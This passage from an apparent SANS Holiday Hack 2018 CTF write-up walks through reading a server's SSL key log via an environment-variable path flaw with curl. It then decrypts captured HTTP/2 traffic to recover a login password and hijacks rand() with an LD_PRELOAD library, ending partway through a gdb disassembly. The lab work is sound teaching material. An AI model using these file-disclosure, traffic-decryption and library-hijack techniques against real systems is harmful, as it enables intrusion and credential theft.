    <span class="kr">const</span> <span class="nx">action</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">action</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="nx">Session</span><span class="p">.</span><span class="nx">authenticated</span> <span class="o">&amp;&amp;</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">api_functions</span><span class="p">).</span><span class="nx">includes</span><span class="p">(</span><span class="nx">action</span><span class="p">))</span> <span class="o">||</span> <span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">,</span><span class="s1">&#39;register&#39;</span><span class="p">,</span><span class="s1">&#39;users&#39;</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">action</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">api_functions</span><span class="p">[</span><span class="nx">action</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;function&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span><span class="p">{</span>
          <span class="nx">await</span> <span class="nx">api_functions</span><span class="p">[</span><span class="nx">action</span><span class="p">](</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">,</span> <span class="nx">Session</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
          <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span><span class="o">=</span><span class="mi">500</span><span class="p">;</span>
          <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span><span class="o">=</span><span class="nx">e</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
        <span class="p">}</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span><span class="o">=</span><span class="s1">&#39;Not Found&#39;</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span><span class="o">=</span><span class="mi">401</span><span class="p">;</span>
      <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span><span class="o">=</span><span class="s1">&#39;Unauthorized&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">await</span> <span class="nx">next</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="c1">//Route for anything in the public folder except index, home and register</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">env_dirs</span><span class="p">,</span>  <span class="nx">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">Session</span> <span class="o">=</span> <span class="nx">await</span> <span class="nx">sessionizer</span><span class="p">(</span><span class="nx">ctx</span><span class="p">);</span>
    <span class="c1">//Splits into an array delimited by /</span>
    <span class="kd">let</span> <span class="nx">split_path</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">.</span><span class="nx">path</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">).</span><span class="nx">clean</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
    <span class="c1">//Grabs directory which should be first element in array</span>
<span class="hll">    <span class="kd">let</span> <span class="nx">dir</span> <span class="o">=</span> <span class="nx">split_path</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">toUpperCase</span><span class="p">();</span>
</span>    <span class="nx">split_path</span><span class="p">.</span><span class="nx">shift</span><span class="p">();</span>
    <span class="kd">let</span> <span class="nx">filename</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span><span class="o">+</span><span class="nx">split_path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="nx">filename</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">filename</span> <span class="o">=</span> <span class="nx">filename</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\.\./g</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">[</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span><span class="s1">&#39;home.html&#39;</span><span class="p">,</span><span class="s1">&#39;register.html&#39;</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">filename</span><span class="p">))</span> <span class="p">{</span>
    <span class="nx">ctx</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span><span class="nx">mime</span><span class="p">.</span><span class="nx">lookup</span><span class="p">(</span><span class="nx">__dirname</span><span class="o">+</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">[</span><span class="nx">dir</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;/pub/&#39;</span><span class="p">)</span><span class="o">+</span><span class="nx">filename</span><span class="p">))</span>
<span class="hll">    <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__dirname</span><span class="o">+</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">[</span><span class="nx">dir</span><span class="p">]</span> <span class="o">||</span> <span class="s1">&#39;/pub/&#39;</span><span class="p">)</span><span class="o">+</span><span class="nx">filename</span><span class="p">)</span>
</span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nx">ctx</span><span class="p">.</span><span class="nx">status</span><span class="o">=</span><span class="mi">404</span><span class="p">;</span>
    <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span><span class="o">=</span><span class="s1">&#39;Not Found&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">ctx</span><span class="p">.</span><span class="nx">body</span><span class="o">=</span><span class="nx">e</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
<span class="p">}</span>
<span class="p">});</span>

<span class="nx">router</span>
<span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/api/:action&#39;</span><span class="p">,</span> <span class="nx">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
<span class="nx">await</span> <span class="nx">api_function</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span>
<span class="p">})</span>
<span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/api/:action&#39;</span><span class="p">,</span> <span class="nx">koaBody</span><span class="p">({</span> <span class="nx">multipart</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}),</span> <span class="nx">async</span> <span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
<span class="nx">await</span> <span class="nx">api_function</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span>
<span class="p">})</span>

<span class="kr">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">http2</span><span class="p">.</span><span class="nx">createSecureServer</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">app</span><span class="p">.</span><span class="nx">callback</span><span class="p">());</span>
<span class="nx">server</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">443</span><span class="p">);</span>
</pre></div>
</td></tr></table><p>What can we learn from this source code:</p>
<ul class="simple">
<li>Line 26: the application is running in dev mode</li>
<li>Line 27: the <code>key_log_path</code> variable holds the path to the SSL secrets
used by the server</li>
<li>Line 27: the <code>process.env</code> contains the path to the SSL secrets file</li>
<li>Lines 86-88: in dev mode, every directory that is in the <code>process.env</code>
variable is potentially accessible via the webserver.</li>
<li>Lines 132, 140: if we access <a class="reference external" href="https://packalyzer.kringlecastle.com/secret_directory/secret_file">https://packalyzer.kringlecastle.com/secret_directory/secret_file</a>,
the webserver will use the value of <code>process.env.secret_directory</code> as
the name of our folder to get the <code>secret_file</code>.</li>
</ul>
<p>This last point is interesting. Since <code>process.env</code> contains the path to
the SSL secrets, we can try to use this automatic resolution to get the content
of <code>key_log_path</code>. First let's try to resolve the
<code>process.env.SSLKEYLOGFILE</code> variable:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> curl <span class="s1">&#39;https://packalyzer.kringlecastle.com/SSLKEYLOGFILE/&#39;</span>
<span class="go">Error: ENOENT: no such file or directory, open &#39;/opt/http2packalyzer_clientrandom_ssl.log/</span>
</pre></div>
<p>So, the value of this variable seems to be
<code>packalyzer_clientrandom_ssl.log</code>. We can now access the file. We use the
same trick as before to resolve the <code>process.env.DEV</code> variable:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> curl <span class="s1">&#39;https://packalyzer.kringlecastle.com/DEV/packalyzer_clientrandom_ssl.log&#39;</span>
<span class="go">CLIENT_RANDOM D5DFF2B39A827877C64457B9F246A2BC05869EDA679F2167692ACB36480AABB4 B6B4C39A3161566566E6291030EDEBA1F91511B8513F07CBE4A159022F497A1AEB18821887B51FDC1764F2219DEFC001</span>
<span class="go">CLIENT_RANDOM BBEE641A4FB1B77D8D23FE324649B02E30B024BEA322D61CC77F2A1A5A6423C7 6289BBAFD1DF5C23CCC68C6E579D71E1D18416F2D0CEB05351E10A7C27A22FEDC66221C33DFCC908490C0EBBF9BF8F97</span>
<span class="go">CLIENT_RANDOM 1C7E42420FBC79D157D86366DB1907CEC1D27343893647AF60D72CD4913825FE AEBC249465A01BA3A8D30E1FEB665CA0128A4F1BAC14D809F1B1F6F38F7B2423FFBC45E1402CA65E8B746174716F9B89</span>
<span class="go">CLIENT_RANDOM 0E21203AE0707D515D46EF381CB7E04729110B18BF8DBE8EE8C6AA2D7F1A3742 C3461766C26A9209F1F248C4C7FA9A5E588A9E7933697D7F586D3380B187A344B04EB41C9232207008E54D9E4EAF53F8</span>
<span class="go">CLIENT_RANDOM 2E6C446BACF3F740DA5DFB31BC922138C49B13C6DD522C770F81339D0582085A 90E48FE08378BB0E6569CB27547E8AAF724726289AE86188483A8C4D7B76A52DCA0598BBD8FF78E5F70CFDEA02208859</span>
<span class="go">[snip]</span>
</pre></div>
<p>Awesome, we get the SSL secrets of the webserver. We can use this to decrypt
our sniffed traffic. Here's what we'll do:</p>
<ul class="simple">
<li>We'll sniff 20 seconds of traffic.</li>
<li>We'll quickly download the SSl secrets file, because it will most likely
contain the secrets for our sniffed traffic.</li>
</ul>
<p><a class="reference external" href="/docs/sans-christmas-challenge-2018/31002530_14-1-2019_9-57-43.pcap">Here</a>'s
my capture file, and <a class="reference external" href="/docs/sans-christmas-challenge-2018/packalyzer_clientrandom_ssl.log">here</a>'s
my SSL secrets file. Now, let's open up Wireshark, so that we can decrypt the
traffic. I found <a class="reference external" href="https://lekensteyn.nl/files/wireshark-ssl-decryption.pdf#page=11">these slides</a>
that explain how you can configure Wireshark to use our SSL secrets:</p>
<img alt="packalyzer_wireshark_http2_decrypted.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_wireshark_http2_decrypted.png" />
<p>Awesome, we now have decrypted the HTTP/2 traffic to the website. If we look
around, we see a login request:</p>
<img alt="packalyzer_wireshark_password.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_wireshark_password.png" />
<p>We found Alabaster's password to the packalyzer,
<code>alabaster:Packer-p&#64;re-turntable192</code>. Let's connect to the web site with
these credentials, and see what capture files he has accessible:</p>
<img alt="packalyzer_alabaster_login.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_alabaster_login.png" />
<p>Hmmm, <code>super_secret_packet_capture.pcap</code>, sounds interesting! You can
download it <a class="reference external" href="/docs/sans-christmas-challenge-2018/super_secret_packet_capture.pcap">here</a>.
Let's open it in Wireshark:</p>
<img alt="packalyzer_wireshark_smtp.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_wireshark_smtp.png" />
<p>We can see some SMTP traffic. Let's follow the TCP stream to get a clearer
picture:</p>
<div class="highlight"><pre><span></span>220 mail.kringlecastle.com ESMTP Postfix (Ubuntu)
EHLO Mail.kringlecastle.com
250-mail.kringlecastle.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN

MAIL FROM:&lt;Holly.evergreen@mail.kringlecastle.com&gt;
250 2.1.0 Ok
RCPT TO:&lt;alabaster.snowball@mail.kringlecastle.com&gt;
250 2.1.5 Ok
DATA
354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
Date: Fri, 28 Sep 2018 11:33:17 -0400
To: alabaster.snowball@mail.kringlecastle.com
From: Holly.evergreen@mail.kringlecastle.com
Subject: test Fri, 28 Sep 2018 11:33:17 -0400
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=&quot;----=_MIME_BOUNDARY_000_11181&quot;

------=_MIME_BOUNDARY_000_11181
Content-Type: text/plain

Hey alabaster,

<span class="hll">Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.
</span>
------=_MIME_BOUNDARY_000_11181
Content-Type: application/octet-stream
Content-Transfer-Encoding: BASE64
Content-Disposition: attachment

JVBERi0xLjUKJb/3ov4KOCAwIG9iago8PCAvTGluZWFyaXplZCAxIC9MIDk3ODMxIC9IIFsgNzM4
IDE0MCBdIC9PIDEyIC9FIDc3MzQ0IC9OIDIgL1QgOTc1MTcgPj4KZW5kb2JqCiAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKOSAwIG9iago8PCAv
[snip]
2zMAAFMTA30KZW5kc3RyZWFtCmVuZG9iagogICAgICAgICAgICAgICAgICAgICAgICAgICAgIApz
dGFydHhyZWYKMjE2CiUlRU9GCg==

------=_MIME_BOUNDARY_000_11181--


.

250 2.0.0 Ok: queued as 4CF931B5C3C0
QUIT
221 2.0.0 Bye
</pre></div>
<p>We get a mail from Molly Evergreen with an attached document that explains
<a class="reference external" href="https://en.wikipedia.org/wiki/Transposition_(music)">music transposition</a>.
Let's copy/paste the base64 encoded document and decode it:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> base64 -d &lt; attachment.b64 &gt; attachment
<span class="gp">$</span> file attachment
<span class="go">attachment: PDF document, version 1.5</span>
<span class="gp">$</span> mv attachment music_transposition.pdf
</pre></div>
<p>We get a <a class="reference external" href="/docs/sans-christmas-challenge-2018/music_transposition.pdf">PDF file</a>.
Here's what it says:</p>
<blockquote>
<p>A piano keyboard gives us easy access to every (western) tone. As we go
from left to right, the pitches get higher. Pressing the middle A, for
example, would give us a tone of 440 Hertz. Pressing the next A up (to the
right) gives us 880 Hz, while the next one down (left) produces 220 Hz.
These A tones each sound very similar to us - just higher and lower. Each A
is an &quot;octave&quot; apart from the next. Going key by key, we count 12 &quot;half
tone&quot; steps between one A and the next - 12 steps in an octave.</p>
<p>As you may have guessed, elf (and human) ears perceive pitches
logarithmically. That is, the frequency jump between octaves doubles as we
go up the keyboard, and that sounds normal to us. Consequently, the precise
frequency of each note other than A can only be cleanly expressed with a
log base 12 expression. Ugh! For our purposes though, we can think of note
separation in terms of whole and half steps.</p>
<p>Have you noticed the black keys on the keyboard? They represent half steps
between the white keys. For example, the black key between C and D is
called C# (c-sharp) or Db (d-flat). Going from C to D is a whole step, but
either is a half step from C#/Db. Some white keys don’t have black ones
between them. B &amp; C and E &amp; F are each only a half step apart. Why? Well,
it turns out that our ears like it that way. Try this: press C D E F G A B
C on a piano. It sounds natural, right? The &quot;C major&quot; scale you just played
matches every other major scale:</p>
<ul class="simple">
<li>whole step from C to D</li>
<li>whole step from D to E</li>
<li>half step from E to F</li>
<li>whole step from F to G</li>
<li>Whole step from G to A</li>
<li>Whole step from A to B, and finally</li>
<li>Half step from B to C</li>
</ul>
<p>If you follow that same pattern (whole whole half whole whole whole half),
you can start from any note on the keyboard and play a major scale. So a Bb
major scale would be Bb C D Eb F G A Bb. You can get this by counting whole
and half steps up from Bb or by taking each note in the C major scale and
going down a whole step.</p>
<p>This uniform shifting of tones is called transposition. This is done all
the time in music because of differences in how instruments are designed,
the sound an arranger wants to achieve, or the comfortable vocal range of a
singer. Some elves can do this on the fly without really thinking, but it
can always be done manually, looking at a piano keyboard.</p>
<p>To look at it another way, consider a song &quot;written in the key of Bb.&quot; If
the musicians don’t like that key, it can be transposed to A with a little
thought. First, how far apart are Bb and A? Looking at our piano, we see
they are a half step apart. OK, so for each note, we’ll move down one half
step. Here’s an original in Bb:</p>
<p>D C Bb C D D D C C C D F F D C Bb C D D D D C C D C Bb</p>
<p>And take everything down one half step for A:</p>
<p>C# B A B C# C# C# B B B C# E E C# B A B C# C# C# C# B B C# B A</p>
<p>We’ve just taken Mary Had a Little Lamb from Bb to A!</p>
</blockquote>
<p>So, the song in the document is &quot;Mary Had a Little Lamb&quot;!</p>
</div>
</div>
<div class="section" id="ransomware-recovery">
<h2><a class="toc-backref" href="#id36">Ransomware Recovery</a></h2>
<div class="section" id="shiny-upatree-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id37">Shiny Upatree's Cranberry Pi Challenge</a></h3>
<p>We must win Shiny Upatree's lottery.</p>
<div class="highlight"><pre><span></span><span class="go">I&#39;ll hear the bells on Christmas Day</span>
<span class="go">Their sweet, familiar sound will play</span>
<span class="go">  But just one elf,</span>
<span class="go">  Pulls off the shelf,</span>
<span class="go">The bells to hang on Santa&#39;s sleigh!</span>
<span class="go">Please call me Shinny Upatree</span>
<span class="go">I write you now, &#39;cause I would be</span>
<span class="go">  The one who gets -</span>
<span class="go">  Whom Santa lets</span>
<span class="go">The bells to hang on Santa&#39;s sleigh!</span>
<span class="go">But all us elves do want the job,</span>
<span class="go">Conveying bells through wint&#39;ry mob</span>
<span class="go">  To be the one</span>
<span class="go">  Toy making&#39;s done</span>
<span class="go">The bells to hang on Santa&#39;s sleigh!</span>
<span class="go">To make it fair, the Man devised</span>
<span class="go">A fair and simple compromise.</span>
<span class="go">  A random chance,</span>
<span class="go">  The winner dance!</span>
<span class="go">The bells to hang on Santa&#39;s sleigh!</span>
<span class="go">Now here I need your hacker skill.</span>
<span class="go">To be the one would be a thrill!</span>
<span class="go">  Please do your best,</span>
<span class="go">  And rig this test</span>
<span class="go">The bells to hang on Santa&#39;s sleigh!</span>
<span class="go">Complete this challenge by winning the sleighbell lottery for Shinny Upatree.</span>
<span class="gp">elf@04895b80b092:~$</span>
</pre></div>
<p>So, let's see this lottery:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@04895b80b092:~$</span> ls
<span class="go">gdb  objdump  sleighbell-lotto</span>
<span class="gp">elf@04895b80b092:~$</span> ./sleighbell-lotto
<span class="go">The winning ticket is number 1225.</span>
<span class="go">Rolling the tumblers to see what number you&#39;ll draw...</span>
<span class="go">You drew ticket number 4526!</span>
<span class="go">Sorry - better luck next year!</span>
</pre></div>
<p>Hmm, let's try again:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@04895b80b092:~$</span> ./sleighbell-lotto
<span class="go">The winning ticket is number 1225.</span>
<span class="go">Rolling the tumblers to see what number you&#39;ll draw...</span>
<span class="go">You drew ticket number 9478!</span>
<span class="go">Sorry - better luck next year!</span>
</pre></div>
<p>So, we draw a random number, and we're supposed to get 1225.</p>
<div class="section" id="id1">
<h4><a class="toc-backref" href="#id38">Yannick's (dirty) solution</a></h4>
<p>If you remember, we had a similar challenge in <a class="reference external" href="/posts/2018/01/10/sans-christmas-challenge-2017/#id14">last year's Holiday Hack</a>. We can create a
fake C library and then use the <a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">LD_PRELOAD</a>
trick to change the behaviour of the <code>rand</code> function. Let's check that
the <code>sleighbell-lotto</code> uses <code>rand</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@04895b80b092:~$</span> ./objdump -d ./sleighbell-lotto  <span class="p">|</span> grep -i rand
<span class="go">00000000000009a0 &lt;srand@plt&gt;:</span>
<span class="go"> 9a0:   ff 25 0a 76 20 00       jmpq   *0x20760a(%rip)        # 207fb0 &lt;srand@GLIBC_2.2.5&gt;</span>
<span class="hll"><span class="go">00000000000009c0 &lt;rand@plt&gt;:</span>
</span><span class="hll"><span class="go"> 9c0:   ff 25 fa 75 20 00       jmpq   *0x2075fa(%rip)        # 207fc0 &lt;rand@GLIBC_2.2.5&gt;</span>
</span><span class="go">    1505:       e8 96 f4 ff ff          callq  9a0 &lt;srand@plt&gt;</span>
<span class="go">    1520:       e8 9b f4 ff ff          callq  9c0 &lt;rand@plt&gt;</span>
</pre></div>
<p>Alright, it seems to do so. Let's create our fake library. Trouble is, there's
no <code>gcc</code> on the elf terminal. So let's generate this library on our own
computer, and then copy it to the elf terminal:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> cat hijack_rand.c
<span class="go">int rand()</span>
<span class="go">{</span>
<span class="go">    return 1225;</span>
<span class="go">}</span>
<span class="gp">$</span> gcc -o hijack_rand.so -shared -fPIC ./hijack_rand.c
<span class="gp">$</span> base64 ./hijack_rand.so
<span class="go">f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAQAAAAAAABAAAAAAAAAABAXAAAAAAAAAAAAAEAAOAAH</span>
<span class="go">AEAAGAAXAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAYAAAAAAAA0BgAAAAAAAAAA</span>
<span class="go">IAAAAAAAAQAAAAYAAACADgAAAAAAAIAOIAAAAAAAgA4gAAAAAACgAQAAAAAAAKgBAAAAAAAAAAAg</span>
<span class="go">AAAAAAACAAAABgAAAJAOAAAAAAAAkA4gAAAAAACQDiAAAAAAAFABAAAAAAAAUAEAAAAAAAAIAAAA</span>
<span class="go">AAAAAAQAAAAEAAAAyAEAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAA</span>
<span class="go">[snip]</span>
</pre></div>
<p>Now, let's copy the base64 in the elf terminal:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@04895b80b092:~$</span> <span class="nb">echo</span> <span class="s2">&quot;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAQAAAAAAABAAAAAAAAAABAXAAAAAAAAAAAAAEAAOAAH</span>
<span class="gp">&gt;</span><span class="s2"> AEAAGAAXAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAYAAAAAAAA0BgAAAAAAAAAA</span>
<span class="gp">&gt;</span><span class="s2"> IAAAAAAAAQAAAAYAAACADgAAAAAAAIAOIAAAAAAAgA4gAAAAAACgAQAAAAAAAKgBAAAAAAAAAAAg</span>
<span class="gp">&gt;</span><span class="s2"> AAAAAAACAAAABgAAAJAOAAAAAAAAkA4gAAAAAACQDiAAAAAAAFABAAAAAAAAUAEAAAAAAAAIAAAA</span>
<span class="gp">&gt;</span><span class="s2"> [snip]</span>
<span class="gp">&gt;</span><span class="s2"> CAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAANAUAAAAAAAAfAEAAAAAAAAA</span>
<span class="gp">&gt;</span><span class="s2"> AAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABMFgAAAAAAAMMA</span>
<span class="gp">&gt;</span><span class="s2"> AAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA&quot;</span> &gt; ./hijack_rand.so.b64
<span class="gp">elf@bb438504d48c:~$</span> base64 -d &lt; ./hijack_rand.so.b64 &gt; ./hijack_rand.so
<span class="gp">elf@bb438504d48c:~$</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&quot;./hijack_rand.so&quot;</span> ./sleighbell-lotto
<span class="go">The winning ticket is number 1225.</span>
<span class="go">Rolling the tumblers to see what number you&#39;ll draw...</span>
<span class="go">You drew ticket number 1225!</span>

<span class="go">                                                     .....          ......</span>
<span class="go">                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......</span>
<span class="go">                             .&#39;;:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........</span>
<span class="go">                         &#39;:okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........</span>
<span class="go">                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........</span>
<span class="go">                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........</span>
<span class="go">                &#39;lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......</span>
<span class="go">              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd&#39;</span>
<span class="go">            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx&#39;</span>
<span class="go">           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx&#39;</span>
<span class="go">           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;</span>
<span class="go">          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;</span>
<span class="go">       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc</span>
<span class="go">     ...................,&#39;,,:lxkkkkkkkkkkkkkd.</span>
<span class="go">     ..........................&#39;;;:coxkkkkk:</span>
<span class="go">        ...............................ckd.</span>
<span class="go">          ...............................</span>
<span class="go">                ...........................</span>
<span class="go">                   .......................</span>
<span class="go">                              ....... ...</span>
<span class="go">With gdb you fixed the race.</span>
<span class="go">The other elves we did out-pace.</span>
<span class="go">  And now they&#39;ll see.</span>
<span class="go">  They&#39;ll all watch me.</span>
<span class="go">I&#39;ll hang the bells on Santa&#39;s sleigh!</span>
<span class="go">Congratulations! You&#39;ve won, and have successfully completed this challenge.</span>
</pre></div>
</div>
<div class="section" id="id2">
<h4><a class="toc-backref" href="#id39">The &quot;official&quot; solution</a></h4>
<p>As we can see from the congratulation message, and the fact that <code>gdb</code> is
present on the elf shell, the official way to solve this challenge is to use
<code>gdb</code>. So, let's load the lottery program in <code>gdb</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@2ba77dc8fde8:~$</span> ./gdb -q ./sleighbell-lotto
<span class="go">Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.</span>
<span class="go">(gdb) disas main</span>
<span class="go">Dump of assembler code for function main:</span>
<span class="go">   0x00000000000014ca &lt;+0&gt;:     push   %rbp</span>
<span class="go">   0x00000000000014cb &lt;+1&gt;:     mov    %rsp,%rbp</span>
<span class="go">   0x00000000000014ce &lt;+4&gt;:     sub    $0x10,%rsp</span>
<span class="go">   0x00000000000014d2 &lt;+8&gt;:     lea    0x56d6(%rip),%rdi        # 0x6baf</span>
<span class="go">   0x00000000000014d9 &lt;+15&gt;:    callq  0x970 &lt;getenv@plt&gt;</span>
<span class="go">   0x00000000000014de &lt;+20&gt;:    test   %rax,%rax</span>
<span class="go">   0x00000000000014e1 &lt;+23&gt;:    jne    0x14f9 &lt;main+47&gt;</span>
<span class="go">   0x00000000000014e3 &lt;+25&gt;:    lea    0x56d6(%rip),%rdi        # 0x6bc0</span>
<span class="go">   0x00000000000014ea &lt;+32&gt;:    callq  0x910 &lt;puts@plt&gt;</span>
<span class="go">   0x00000000000014ef &lt;+37&gt;:    mov    $0xffffffff,%edi</span>
<span class="go">   0x00000000000014f4 &lt;+42&gt;:    callq  0x920 &lt;exit@plt&gt;</span>
<span class="go">   0x00000000000014f9 &lt;+47&gt;:    mov    $0x0,%edi</span>
<span class="go">   0x00000000000014fe &lt;+52&gt;:    callq  0x9e0 &lt;time@plt&gt;</span>
<span class="go">   0x0000000000001503 &lt;+57&gt;:    mov    %eax,%edi</span>
<span class="go">   0x0000000000001505 &lt;+59&gt;:    callq  0x9a0 &lt;srand@plt&gt;</span>
<span class="go">   0x000000000000150a &lt;+64&gt;:    lea    0x583f(%rip),%rdi        # 0x6d50</span>
<span class="go">   0x0000000000001511 &lt;+71&gt;:    callq  0x910 &lt;puts@plt&gt;</span>
<span class="go">   0x0000000000001516 &lt;+76&gt;:    mov    $0x1,%edi</span>
<span class="go">   0x000000000000151b &lt;+81&gt;:    callq  0x960 &lt;sleep@plt&gt;</span>
<span class="go">   0x0000000000001520 &lt;+86&gt;:    callq  0x9c0 &lt;rand@plt&gt;</span>
<span class="go">   0x0000000000001525 &lt;+91&gt;:    mov    %eax,%ecx</span>
<span class="go">   0x0000000000001527 &lt;+93&gt;:    mov    $0x68db8bad,%edx</span>
<span class="go">   0x000000000000152c &lt;+98&gt;:    mov    %ecx,%eax</span>
